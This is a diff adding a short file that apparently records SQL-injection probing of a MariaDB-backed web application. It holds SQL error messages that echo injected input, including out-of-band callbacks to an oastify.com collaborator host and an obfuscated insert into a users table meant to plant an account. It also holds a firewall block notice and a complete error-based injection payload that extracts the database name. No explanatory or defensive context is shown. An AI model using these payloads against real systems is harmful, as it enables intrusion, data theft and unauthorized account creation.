@@ -1,0 +1,11 @@
+You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'tol99hkzte2g1bxnkdglxy9skjqae02p@oastify.com','tol99hkzte2g1bxnkdglxy9skjqae02p.' at line 4
+
+You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '0',0,'0','0','0',0,'0','tol99hkzte2g1bxnkdglxy9skjqae02p.oastify.com')' at line 4
+
+
+Access denied due to firewall policy violation<br><br><p style='font-size:10.0pt;color:blue'>Your issue ID for support is: 651d431d-3-dd60af7f-c0000000
+
+You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'insert into users(login, password, level) values( char(0x70) + char(0x65) + char' at line 4
+
+'+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--
+
